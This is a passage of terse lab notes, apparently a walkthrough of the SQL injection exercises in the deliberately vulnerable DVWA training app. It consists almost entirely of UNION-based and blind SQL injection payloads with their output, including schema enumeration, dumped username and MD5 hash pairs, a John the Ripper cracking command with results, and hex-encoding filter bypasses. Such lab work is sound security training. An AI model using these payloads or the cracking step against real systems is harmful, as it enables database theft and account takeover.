https://sharpforce.gitbook.io/cybersecurity/walkthroughs/damn-vulnerable-web-application/damn-vulnerable-web-application-dvwa/sql-injection-blind/niveau-medium

# SQL Injection

1' union select 'username', 'password' -- -
1' union SELECT DATABASE(), 'abc' -- -

ID: 1' union SELECT DATABASE(), 'abc' -- -
First name: dvwa
Surname: abc

0' union SELECT table_name, 'abc' FROM information_schema.tables WHERE table_schema = 'dvwa' -- -

ID: 0' union SELECT table_name, 'abc' FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
First name: users
Surname: abc

ID: 0' union SELECT table_name, 'abc' FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
First name: guestbook
Surname: abc


0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: user_id
Surname: abc

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: first_name
Surname: abc

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: last_name
Surname: abc

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: user
Surname: abc

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: password
Surname: abc

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: avatar
Surname: abc

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: last_login
Surname: abc

ID: 0' union  SELECT COLUMN_NAME, 'abc' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
First name: failed_login
Surname: abc

0' union  SELECT user, password FROM users -- -


ID: 0' union  SELECT user, password FROM users -- -
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 0' union  SELECT user, password FROM users -- -
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 0' union  SELECT user, password FROM users -- -
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 0' union  SELECT user, password FROM users -- -
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 0' union  SELECT user, password FROM users -- -
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99



admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99

$ john  --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
$ john  hashes.txt --show --format=Raw-MD5
admin:password
gordonb:abc123
1337:charley
pablo:letmein
smithy:password







union  SELECT COLUMN_NAME, \xbf\x27abc\xbf\x27 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = \xbf\x27dvwa\xbf\x27 AND TABLE_NAME = \xbf\x27users\xbf\x27 -- -



10 union select user, password from users -- -

ASCII Hex

10 union SELECT DATABASE(), 1 -- -
==> dvwa


0x64767761 = dvwa

10 union SELECT table_name, 1 FROM information_schema.tables WHERE table_schema = 0x64767761 -- -
First name: users
First name: guestbook

SELECT concat('0x',hex(ascii('u')),hex(ascii('s')),hex(ascii('e')), hex(ascii('r')), hex(ascii('s')))
0x7573657273=users


0' union  SELECT COLUMN_NAME, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 0x64767761 AND TABLE_NAME = 0x7573657273 -- -

First name: user_id
First name: first_name
First name: last_name
First name: user
First name: password
First name: avatar
First name: last_login
First name: failed_login


10 union SELECT users, password FROM  users -- -

$_DVWA = array();
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'dvwa';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';
$_DVWA[ 'db_port'] = '3306

$con = mysqli_connect( $_DVWA[ 'db_server' ],  $_DVWA[ 'db_user' ],  $_DVWA[ 'db_password' ], "", $_DVWA[ 'db_port' ] );



0' union select 1, 2 -- -
0' union SELECT user, password FROM users where user='admin
0' union SELECT user, password FROM users -- -
0' union SELECT concat(user), concat(password) FROM users -- -

SELECT ord(substr("abcd",2,1))


# blink

$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 

## Name of database
dwva

1000' union select 1, 1 FROM users -- -

1000' union select user, password FROM users -- -
1000' union select user, password FROM users where user='admin

1000' union select user, password FROM users where SUBSTRING(user,1,1)='a
1000' union select user, password FROM users where SUBSTRING(user,1,5)='admin
1000' union select user, password FROM users where SUBSTRING(user,1,5)='admin
1000' union select user, password FROM users where user='admin' and length(user)='5
1000' union select user, password FROM users where user='admin' and length(user)=5 -- -
1000' union select user, password FROM users where user='admin' and length(password)=32 -- -

## medium

0x64767761
$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
1000 union select 1, 2 where length(DATABASE())=4
1000 union select 1, 2 where hex(substr(DATABASE(),1,1))=64
1000 union select 1, 2 where hex(substr(DATABASE(),2,1))=76
1000 union select 1, 2 where hex(substr(DATABASE(),3,1))=77
1000 union select 1, 2 where hex(substr(DATABASE(),4,1))=61




1000 union select user, password FROM users -- -
1000 union select user, password from users where user_id=1 -- -

1000 union select user, password FROM users where user='admin' and length(password)=32 -- -
1000 union select user, password FROM users where length(password)=32 -- -
select user, password from users where user_id=1000 union select user, password from users where user_id=1 -- -




dvwaSession